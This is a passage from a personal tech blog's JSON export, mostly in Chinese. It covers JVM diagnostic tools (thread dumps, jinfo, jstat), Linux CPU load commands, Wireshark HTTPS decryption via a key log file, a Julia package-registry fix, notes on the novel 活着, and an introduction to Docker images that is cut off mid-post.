tid=0x00007f0411464800 nid=0x24c0 waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE\"http-nio-8084-exec-45\" #88 daemon prio=5 os_prio=0 tid=0x00007f0410ba0800 nid=0x195 waiting on condition [0x00007f03fe3dc000] java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x00000000d71bdf78&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039) at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442) at org.apache.tomcat.util.threads.TaskQueue.take(TaskQueue.java:103) at org.apache.tomcat.util.threads.TaskQueue.take(TaskQueue.java:31) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)\"Thread-7\" #41 daemon prio=5 os_prio=0 tid=0x00007f040c07e000 nid=0x11be waiting on condition [0x00007f0404fe8000] java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x00000000d7467db8&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039) at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442) at org.LatencyUtils.PauseDetector$PauseDetectorThread.run(PauseDetector.java:85)\"lettuce-nioEventLoop-4-1\" #40 daemon prio=5 os_prio=0 tid=0x0000000001c34000 nid=0x11bd runnable [0x00007f04050e9000] java.lang.Thread.State: RUNNABLE at sun.nio.ch.EPollArrayWrapper.epollWait(Native Method) at sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269) at sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93) at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) - locked &lt;0x00000000d7467ff8&gt; (a io.netty.channel.nio.SelectedSelectionKeySet) - locked &lt;0x00000000d7467fe8&gt; (a java.util.Collections$UnmodifiableSet) - locked &lt;0x00000000d7468010&gt; (a sun.nio.ch.EPollSelectorImpl) at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62) at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:884) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.lang.Thread.run(Thread.java:748)\"Druid-ConnectionPool-Create-1478196796\" #37 daemon prio=5 os_prio=0 tid=0x00007f0400024800 nid=0x3cc waiting on condition [0x00007f0428ffe000] java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x00000000d6713938&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039) at com.alibaba.druid.pool.DruidDataSource$CreateConnectionThread.run(DruidDataSource.java:2059)\"Abandoned connection cleanup thread\" #36 daemon prio=5 os_prio=0 tid=0x00007f0400154000 nid=0x3ca in Object.wait() [0x00007f04281b3000] java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143) - locked &lt;0x00000000d71bd738&gt; (a java.lang.ref.ReferenceQueue$Lock) at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:64) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)\"DestroyJavaVM\" #35 prio=5 os_prio=0 tid=0x00007f0438009000 nid=0x393 waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE\"C2 CompilerThread0\" #5 daemon prio=9 os_prio=0 tid=0x00007f04380d5800 nid=0x398 waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE\"Signal Dispatcher\" #4 daemon prio=9 os_prio=0 tid=0x00007f04380d4000 nid=0x397 runnable [0x0000000000000000] java.lang.Thread.State: RUNNABLE\"Finalizer\" #3 daemon prio=8 os_prio=0 tid=0x00007f04380a1000 nid=0x396 in Object.wait() [0x00007f043c897000] java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143) - locked &lt;0x00000000d56578d8&gt; (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164) at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:212)\"Reference Handler\" #2 daemon prio=10 os_prio=0 tid=0x00007f043809c800 nid=0x395 in Object.wait() [0x00007f043c998000] java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) at java.lang.Object.wait(Object.java:502) at java.lang.ref.Reference.tryHandlePending(Reference.java:191) - locked &lt;0x00000000d5657a90&gt; (a java.lang.ref.Reference$Lock) at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)\"VM Thread\" os_prio=0 tid=0x00007f0438095000 nid=0x394 runnable\"VM Periodic Task Thread\" os_prio=0 tid=0x00007f04380e0000 nid=0x39b waiting on conditionJNI global references: 1495 主要是一些线程的状态信息,可用来检测定位死锁问题。 jinfojinfo 主要是输出系统和 JVM 的参数信息。 1234567891011121314151617[root@localhost ~]# jinfoUsage: jinfo [option] &lt;pid&gt; (to connect to running process) jinfo [option] &lt;executable &lt;core&gt; (to connect to a core file) jinfo [option] [server_id@]&lt;remote server IP or hostname&gt; (to connect to remote debug server)where &lt;option&gt; is one of: -flag &lt;name&gt; to print the value of the named VM flag -flag [+|-]&lt;name&gt; to enable or disable the named VM flag -flag &lt;name&gt;=&lt;value&gt; to set the named VM flag to the given value -flags to print VM flags -sysprops to print Java system properties &lt;no option&gt; to print both of the above -h | -help to print this help message 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172[root@localhost ~]# jinfo 912Attaching to process ID 912, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.171-b11Java System Properties:java.runtime.name = Java(TM) SE Runtime Environmentjava.vm.version = 25.171-b11sun.boot.library.path = /usr/java/jdk1.8.0_171-amd64/jre/lib/amd64java.protocol.handler.pkgs = org.springframework.boot.loaderjava.vendor.url = http://java.oracle.com/java.vm.vendor = Oracle Corporationpath.separator = :file.encoding.pkg = sun.iojava.vm.name = Java HotSpot(TM) 64-Bit Server VMsun.os.patch.level = unknownsun.java.launcher = SUN_STANDARDuser.country = USuser.dir = /data/bj/devops/tytyjava.vm.specification.name = Java Virtual Machine SpecificationPID = 912java.runtime.version = 1.8.0_171-b11java.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentos.arch = amd64java.endorsed.dirs = /usr/java/jdk1.8.0_171-amd64/jre/lib/endorsedline.separator =java.io.tmpdir = /tmpjava.vm.specification.vendor = Oracle Corporationos.name = Linuxsun.jnu.encoding = UTF-8java.library.path = /usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/libspring.beaninfo.ignore = truesun.nio.ch.bugLevel =java.specification.name = Java Platform API Specificationjava.class.version = 52.0sun.management.compiler = HotSpot 64-Bit Tiered Compilersos.version = 3.10.0-693.el7.x86_64user.home = /rootuser.timezone = Asia/Shanghaicatalina.useNaming = falsejava.awt.printerjob = sun.print.PSPrinterJobfile.encoding = UTF-8java.specification.version = 1.8catalina.home = /tmp/tomcat.2534035305981805332.8084user.name = rootjava.class.path = /data/bj/tyty-0.0.1-SNAPSHOT.jarjava.vm.specification.version = 1.8sun.arch.data.model = 64sun.java.command = /data/bj/tyty-0.0.1-SNAPSHOT.jarjava.home = /usr/java/jdk1.8.0_171-amd64/jreuser.language = enjava.specification.vendor = Oracle Corporationawt.toolkit = sun.awt.X11.XToolkitjava.vm.info = mixed modejava.version = 1.8.0_171java.ext.dirs = /usr/java/jdk1.8.0_171-amd64/jre/lib/ext:/usr/java/packages/lib/extsun.boot.class.path = /usr/java/jdk1.8.0_171-amd64/jre/lib/resources.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/rt.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/sunrsasign.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jsse.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jce.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/charsets.jar:/usr/java/jdk1.8.0_171-amd64/jre/lib/jfr.jar:/usr/java/jdk1.8.0_171-amd64/jre/classesjava.awt.headless = truejava.vendor = Oracle Corporationcatalina.base = /tmp/tomcat.2534035305981805332.8084file.separator = /java.vendor.url.bug = http://bugreport.sun.com/bugreport/sun.io.unicode.encoding = UnicodeLittlesun.cpu.endian = littlesun.cpu.isalist =VM Flags:Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=536870912 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357892096 -XX:MinHeapDeltaBytes=196608 -XX:NewSize=178913280 -XX:OldSize=357957632 -XX:+UseCompressedClassPointers -XX:+UseCompressedOopsCommand line: -Xms512m -Xmx1024m jstatjvm 统计信息. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root@localhost ~]# jstatinvalid argument countUsage: jstat -help|-options jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]Definitions: &lt;option&gt; An option reported by the -options option &lt;vmid&gt; Virtual Machine Identifier. A vmid takes the following form: &lt;lvmid&gt;[@&lt;hostname&gt;[:&lt;port&gt;]] Where &lt;lvmid&gt; is the local vm identifier for the target Java virtual machine, typically a process id; &lt;hostname&gt; is the name of the host running the target Java virtual machine; and &lt;port&gt; is the port number for the rmiregistry on the target host. See the jvmstat documentation for a more complete description of the Virtual Machine Identifier. &lt;lines&gt; Number of samples between header lines. &lt;interval&gt; Sampling interval. The following forms are allowed: &lt;n&gt;[\"ms\"|\"s\"] Where &lt;n&gt; is an integer and the suffix specifies the units as milliseconds(\"ms\") or seconds(\"s\"). The default units are \"ms\". &lt;count&gt; Number of samples to take before terminating. -J&lt;flag&gt; Pass &lt;flag&gt; directly to the runtime system.[root@localhost ~]# jstat -helpUsage: jstat -help|-options jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]Definitions: &lt;option&gt; An option reported by the -options option &lt;vmid&gt; Virtual Machine Identifier. A vmid takes the following form: &lt;lvmid&gt;[@&lt;hostname&gt;[:&lt;port&gt;]] Where &lt;lvmid&gt; is the local vm identifier for the target Java virtual machine, typically a process id; &lt;hostname&gt; is the name of the host running the target Java virtual machine; and &lt;port&gt; is the port number for the rmiregistry on the target host. See the jvmstat documentation for a more complete description of the Virtual Machine Identifier. &lt;lines&gt; Number of samples between header lines. &lt;interval&gt; Sampling interval. The following forms are allowed: &lt;n&gt;[\"ms\"|\"s\"] Where &lt;n&gt; is an integer and the suffix specifies the units as milliseconds(\"ms\") or seconds(\"s\"). The default units are \"ms\". &lt;count&gt; Number of samples to take before terminating. -J&lt;flag&gt; Pass &lt;flag&gt; directly to the runtime system.[root@localhost ~]# jstat -options-class-compiler-gc-gccapacity-gccause-gcmetacapacity-gcnew-gcnewcapacity-gcold-gcoldcapacity-gcutil-printcompilation 统计编译信息1234[root@localhost ~]# jstat -compiler 4803Compiled Failed Invalid Time FailedType FailedMethod 18450 2 0 292.99 1 org/springframework/util/ConcurrentReferenceHashMap$Segment restructureIfNecessary Compiled：编译数量。 Failed：失败数量 Invalid：不可用数量 Time：时间 FailedType：失败类型 FailedMethod：失败的方法 统计 GC 信息12345678910111213[root@localhost ~]# jstat -gc 4803 250 10 S0C S1C S0U S1U EC EU OC OU MC MU CCSC CCSU YGC YGCT FGC FGCT GCT6464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 786464.0 6464.0 0.0 0.0 51904.0 13873.2 129364.0 69903.3 89472.0 84206.7 9856.0 8857.8 1526 9.749 10 2.029 11.7 78 S0C、S1C、S0U、S1U：Survivor 0/1 区容量（Capacity）和使用量（Used） EC、EU：Eden 区容量和使用量 OC、OU：年老代容量和使用量 MC、MU：元数据区容量和使用量 CCSC、CCSU:压缩类空间容量和使用量 YGC、YGCT：年轻代 GC 次数和 GC 耗时 FGC、FGCT：Full GC 次数和 Full GC 耗时 GCT：GC 总耗时 GC 统计信息123[root@localhost ~]# jstat -gcutil 4803 S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 0.00 0.00 49.91 54.04 94.12 89.87 1526 9.749 10 2.029 11.778 S0：S0 区当前使用比例 S1：S1 区当前使用比例 E： Eden 区使用比例 O：老年代使用比例 M：元数据区使用比例 CCS：压缩类空间使用百分比 YGC：年轻代垃圾回收次数 FGC：老年代垃圾回收次数 FGCT：老年代垃圾回收消耗时间 GCT：垃圾回收消耗总时间 此文到此算结束了,略显粗糙，如有错误欢迎批评指正。 参考资料 OQL 语法 Object_Query_Language","updated":"2020-07-19T00:23:27.865Z","tags":[{"name":"jvm","slug":"jvm","permalink":"http://xwolf191.github.io/tags/jvm/"}]},{"title":"Linux性能调优","date":"2019-02-20T06:00:00.000Z","path":"2019/02/20/linux/Linux性能调优/","text":"此图涉及到CPU、内存、IO、网络等各种命令。本节也主要从这四个方面来介绍linux性能调优. CPUCPU优化之前来几个获取CPU核数的命令.123456789101112131415161718# CPU总核数 = 物理CPU个数 * 每颗物理CPU的核数 # 总逻辑CPU数 = 物理CPU个数 * 每颗物理CPU的核数 * 超线程数# 查看CPU信息（型号） [root@localhost ~]# cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c 4 Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz# 查看物理CPU个数[root@localhost ~]# cat /proc/cpuinfo| grep \"physical id\"| sort| uniq| wc -l2#查看每个物理CPU中core的个数(即核数)[root@localhost ~]# cat /proc/cpuinfo| grep \"cpu cores\"| uniqcpu cores : 2#查看逻辑CPU的个数[root@localhost ~]# cat /proc/cpuinfo| grep \"processor\"| wc -l4 uptime12[root@localhost ~]# uptime 00:16:20 up 2:18, 1 user, load average: 0.00, 0.01, 0.03 对应字段的意思:当前时间 开机时间 在线用户数 平均负载其中平均负载有三个值,分别代表 1分钟、5分钟、15分钟的平均负载。这三个值越来越大代表负载一直在减小,反之就是负载在增加。load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。 top 内存IO网络","updated":"2020-07-19T00:23:27.875Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"wireshark抓取并解密https数据包","date":"2019-02-20T02:30:00.000Z","path":"2019/02/20/开发工具/wireshark抓取并解密https数据包/","text":"wireshark抓取https的数据包不做任何配置的话抓取到数数据包全部是加密的TLSv1.2协议的数据包。需要配置一下来解析数据包,在此记录一下。 配置环境变量(windows)创建对应的文件并配置系统环境变量,变量名为”SSLKEYLOGFILE”,变量值是导出的密钥具体文件地址。 wireshark 配置SSLwireshark中配置上边环境变量中配置的文件路径。 Edit -&gt; preferences -&gt; Protocols -&gt; SSL wireshark 抓包开始抓取https数据包,正常的话会解密数据包,可以看到有HTTP请求了。 查看对应的SSL stream","updated":"2020-07-19T00:23:27.973Z","tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://xwolf191.github.io/tags/wireshark/"}]},{"title":"活着","date":"2019-01-28T08:45:00.000Z","path":"2019/01/28/读书笔记/活着/","text":"作者简介余华，1960年出生，1983年开始写作。至今已经出版长篇小说4部，中短篇小说集6部，随笔集4部。主要作品有《兄弟》《活着》《许三观卖血记》《在细雨中呼喊》等。其作品已被翻译成20多种语言在美国、英国、法国、德国、意大利、西班牙、荷兰、瑞典、挪威、希腊、俄罗斯、保加利亚、匈牙利、捷克、塞尔维亚、斯洛伐克、波兰、巴西、以色列、日本、韩国、越南、泰国和印度等国出版。曾获意大利格林扎纳·卡佛文学奖（1998年）、法国文学和艺术骑士勋章（2004年）、中华图书特殊贡献奖（2005年）、法国国际信使外国小说奖（2008年）等。 内容简介《活着(新版)》讲述了农村人福贵悲惨的人生遭遇。福贵本是个阔少爷，可他嗜赌如命，终于赌光了家业，一贫如洗。他的父亲被他活活气死，母亲则在穷困中患了重病，福贵前去求药，却在途中被国民党抓去当壮丁。经过几番波折回到家里，才知道母亲早已去世，妻子家珍含辛茹苦地养大两个儿女。此后更加悲惨的命运一次又一次降临到福贵身上，他的妻子、儿女和孙子相继死去，最后只剩福贵和一头老牛相依为命，但老人依旧活着，仿佛比往日更加洒脱与坚强。 《活着(新版)》荣获意大利格林扎纳•卡佛文学奖最高奖项（1998年）、台湾《中国时报》10本好书奖（1994年）、香港“博益”15本好书奖（1994年）、第三届世界华文“冰心文学奖”（2002年），入选香港《亚洲周刊》评选的“20世纪中文小说百年百强”、中国百位批评家和文学编辑评选的“20世纪90年代最有影响的10部作品”。 读后感真的是悲剧接踵而至,应接不暇。每次看到转折的时候总是抱有一丝希望,接下来一定会好的。结果总是让人难以接受。丧父母、丧子、丧女、丧妻、丧外孙、丧女婿…. 真是他娘的让人喘不过气来。生活还得继续,不敢生活怎么打击、折磨,只管勇往直前!","updated":"2020-07-19T00:23:28.454Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"julia not found in project, manifest or registry","date":"2019-01-08T08:30:00.000Z","path":"2019/01/08/julia/julia not found in project, manifest or registry/","text":"julia 1.0.3 版本添加包的时候抛出异常.julia not found in project, manifest or registry 12345678(v1.0) pkg&gt; add https://github.com/JuliaIO/JSON.jl Cloning git-repo `https://github.com/JuliaIO/JSON.jl` Updating git-repo `https://github.com/JuliaIO/JSON.jl`[ Info: Assigning UUID a4e475aa-2c49-59aa-8c9b-6b302a36b041 to JSON Resolving package versions...ERROR: The following package names could not be resolved: * julia (not found in project, manifest or registry)Please specify by known `name=uuid`. 添加JSON包的时候抛出这个错误,最终在julia论坛中发现这个问题的解决方法,这个是julia的一个bug。执行下面命令即可.1julia&gt; rm(joinpath(homedir(), \".julia\", \"registries\"); recursive=true) 再次添加包即可. 参考 pkg-add-ijulia-can-not-work","updated":"2020-07-19T00:23:27.872Z","tags":[{"name":"julia","slug":"julia","permalink":"http://xwolf191.github.io/tags/julia/"}]},{"title":"docker入门之镜像","date":"2019-01-05T09:00:00.000Z","path":"2019/01/05/devops/docker入门之镜像/","text":"Docker 镜像是由文件系统叠加而成。最底端是一个文件引导系统，即 bootfs。Docker 用户不会与引导文件系统有直接的交互。Docker 镜像的第二层是 root 文件系统 rootfs，通常是一种或多种操作系统，例如 ubuntu 等。在 Docker 中，文件系统永远都是只读的，在每次修改时，都是进行拷贝叠加从而形成最终的文件系统。Docker 称这样的文件为镜像。一个镜像可以迭代在另一个镜像的顶部。位于下方的镜像称之为父镜像，最底层的镜像称之为基础镜像。最后，当从一个镜像启动容器时，Docker 会在最顶层加载一个读写文件系统作为容器。 其实上节已经介绍了部分的镜像操作的命令,本节继续介绍 docker 镜像相关的操作。 搜索镜像1docker search nginx 其中各字段信息为: NAME:镜像仓库源的名称 DESCRIPTION:镜像的描述 STARS:表示评分 OFFICIAL:是否 docker 官方发布 AUTOMATED:是否自动创建。该类资源允许用户验证资源的来源和内容。 下载镜像可以使用 docker pull NAME[:TAG]命令从网络上下载镜像。如果不显式指定 TAG,默认会选择 latest 标签,即下载最新版本的镜像。 1docker pull nginx 查看镜像的详细信息用命令 docker images 查看所有安装的镜像信息,用 inspect IMAGE ID 查看详细信息 1234567[root@bogon ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEconsul latest 21c1d4ed11da 2 weeks ago 105MBerlang latest fd257b036a25 4 weeks ago 1.06GBrabbitmq management d69a5113ceae 2 months ago 149MBrabbitmq latest e8261c2af9fe 2 months ago 125MB 其中各项信息含义为： REPOSITORY,镜像的来源仓库信息 TAG,镜像的标签信息 IMAGE ID,镜像的 ID CREATED,创建时间 SIZE,镜像大小 1[root@docker ~]# docker inspect 7b2ec12a5042 详细信息如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384[ &#123; \"Id\": \"7b2ec12a50420a859b2731071494750a1040b4e9c76a43ea5cf9179712df5f2a\", \"Parent\": \"1ae58a018d101a53ff771cb30a37e01fe1e0f3ff34abe335178673d8c2135bda\", \"Comment\": \"\", \"Created\": \"2018-07-24T17:21:51.548456912Z\", \"Container\": \"895e85f09f69727097e9c1783362736d7ee9b5b32f9eae1e5e32f2e1002abf14\", \"ContainerConfig\": &#123; \"Hostname\": \"895e85f09f69\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"PortSpecs\": null, \"ExposedPorts\": &#123; \"80/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"NGINX_VERSION=1.15.2-1~stretch\", \"NJS_VERSION=1.15.2.0.2.2-1~stretch\" ], \"Cmd\": [ \"/bin/sh\", \"-c\", \"#(nop) \", \"CMD [\\\"nginx\\\" \\\"-g\\\" \\\"daemon off;\\\"]\" ], \"Image\": \"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3\", \"Volumes\": null, \"VolumeDriver\": \"\", \"WorkingDir\": \"\", \"Entrypoint\": null, \"NetworkDisabled\": false, \"MacAddress\": \"\", \"OnBuild\": [], \"Labels\": &#123; \"maintainer\": \"NGINX Docker Maintainers \\u003cdocker-maint@nginx.com\\u003e\" &#125; &#125;, \"DockerVersion\": \"17.06.2-ce\", \"Author\": \"\", \"Config\": &#123; \"Hostname\": \"\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"PortSpecs\": null, \"ExposedPorts\": &#123; \"80/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"NGINX_VERSION=1.15.2-1~stretch\", \"NJS_VERSION=1.15.2.0.2.2-1~stretch\" ], \"Cmd\": [\"nginx\", \"-g\", \"daemon off;\"], \"Image\": \"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3\", \"Volumes\": null, \"VolumeDriver\": \"\", \"WorkingDir\": \"\", \"Entrypoint\": null, \"NetworkDisabled\": false, \"MacAddress\": \"\", \"OnBuild\": [], \"Labels\": &#123; \"maintainer\": \"NGINX Docker Maintainers \\u003cdocker-maint@nginx.com\\u003e\" &#125; &#125;, \"Architecture\": \"amd64\", \"Os\": \"linux\", \"Size\": 0, \"VirtualSize\": 108954999 &#125;] 默认会显示所有的镜像信息,可以加上-f 指定具体的字段信息。对应字段有一个.符号不能省略。 123[root@bogon ~]# docker inspect -f &#123;&#123;\".VirtualSize\"&#125;&#125; 7b2ec12a5042108954999 删除镜像docker images 命令查看镜像 id,docker rmi IMAGE ID 来删除镜像。 1docker rmi 3535063d9957 提示被容器使用,不能被删除。可以添加参数-f 来强制删除镜像，但是会有很多遗留问题，不建议。通常先删除容器再删除镜像。查看正在运行的容器 1docker ps -a 删除容器,用 docker rm CONTAINER ID 命令来删除容器,删除成功后返回 CONTAINER ID. 容器删除成功后，执行删除镜像命令, 1docker rmi IMAGE ID 创建镜像Docker 创建镜像的方式有三种,基于已有镜像的容器创建、基于本地模板导入、基于 Dockerfile 创建。 基于已有镜像的容器创建主要是使用 docker commit 命令来创建镜像。基本语法 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] 1234567891011[root@bogon ~]# docker commit --helpUsage: docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]Create a new image from a container's changesOptions: -a, --author string Author (e.g., \"John Hannibal Smith &lt;hannibal@a-team.com&gt;\") -c, --change list Apply Dockerfile instruction to the created image -m, --message string Commit message -p, --pause Pause container during commit (default true) -a, 指定作者信息;-c, 指定改变列表;-m, 指定注释信息;-p, 提交过程中中断容器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161[root@bogon ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESffff9fdbe1f2 consul \"docker-entrypoint.s…\" 4 hours ago Exited (1) 4 hours ago node1c3a9f6d71ad2 rabbitmq:management \"docker-entrypoint.s…\" 3 weeks ago Exited (0) 5 seconds ago rabbitmq[root@bogon ~]# docker commit -a \"xwolf\" -m \"test make docker images\" c3a9f6d71ad2 testrabbitmq:1.0sha256:10f9580054c750668c804269857e0c85efe830dee43b75263337db994b168b27[root@bogon ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtestrabbitmq 1.0 10f9580054c7 5 seconds ago 149MBconsul latest 21c1d4ed11da 2 weeks ago 105MBerlang latest fd257b036a25 4 weeks ago 1.06GBrabbitmq management d69a5113ceae 2 months ago 149MBrabbitmq latest e8261c2af9fe 2 months ago 125MB[root@bogon ~]# docker inspect 10f9580054c7[ &#123; \"Id\": \"sha256:10f9580054c750668c804269857e0c85efe830dee43b75263337db994b168b27\", \"RepoTags\": [ \"testrabbitmq:1.0\" ], \"RepoDigests\": [], \"Parent\": \"sha256:d69a5113ceae5e68ab483f780c1ad712c3932a35753f69e6462b32a9f320ad9c\", \"Comment\": \"test make docker images\", \"Created\": \"2019-01-05T19:47:59.660937054Z\", \"Container\": \"c3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf\", \"ContainerConfig\": &#123; \"Hostname\": \"c3a9f6d71ad2\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"ExposedPorts\": &#123; \"15671/tcp\": &#123;&#125;, \"15672/tcp\": &#123;&#125;, \"25672/tcp\": &#123;&#125;, \"4369/tcp\": &#123;&#125;, \"5671/tcp\": &#123;&#125;, \"5672/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/lib/rabbitmq/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"GOSU_VERSION=1.10\", \"RABBITMQ_LOGS=-\", \"RABBITMQ_SASL_LOGS=-\", \"RABBITMQ_GPG_KEY=0A9AF2115F4687BD29803A206B73A36E6026DFCA\", \"RABBITMQ_VERSION=3.7.8\", \"RABBITMQ_GITHUB_TAG=v3.7.8\", \"RABBITMQ_DEBIAN_VERSION=3.7.8-1\", \"LANG=C.UTF-8\", \"HOME=/var/lib/rabbitmq\" ], \"Cmd\": [ \"rabbitmq-server\" ], \"ArgsEscaped\": true, \"Image\": \"rabbitmq:management\", \"Volumes\": &#123; \"/var/lib/rabbitmq\": &#123;&#125; &#125;, \"WorkingDir\": \"\", \"Entrypoint\": [ \"docker-entrypoint.sh\" ], \"OnBuild\": null, \"Labels\": &#123;&#125; &#125;, \"DockerVersion\": \"18.09.1-rc1\", \"Author\": \"xwolf\", \"Config\": &#123; \"Hostname\": 